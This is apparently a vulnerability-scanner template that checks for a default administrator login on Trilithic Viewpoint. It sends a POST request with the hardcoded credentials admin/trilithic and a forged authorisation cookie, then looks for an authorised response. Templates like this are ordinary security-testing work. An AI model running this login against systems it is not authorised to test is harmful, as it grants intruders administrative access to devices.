expression: r0()
id: trilithic-viewpoint-default-password
info:
  author: davidmckennirey
  name: Trilithic Viewpoint Default Login
  severity: high
  verified: false
rules:
  r0:
    expression: response.status == 200 && response.body.bcontains(b'"authorized":true')
      && response.body.bcontains(b'redirectUrl')
    request:
      body: '{u:"admin", t:"undefined", p:"trilithic", d:"", r:false, w:false}

        '
      headers:
        Content-Type: application/json
        Cookie: trilithic_win_auth=false
      method: POST
      path: /ViewPoint/admin/Site/ViewPointLogin
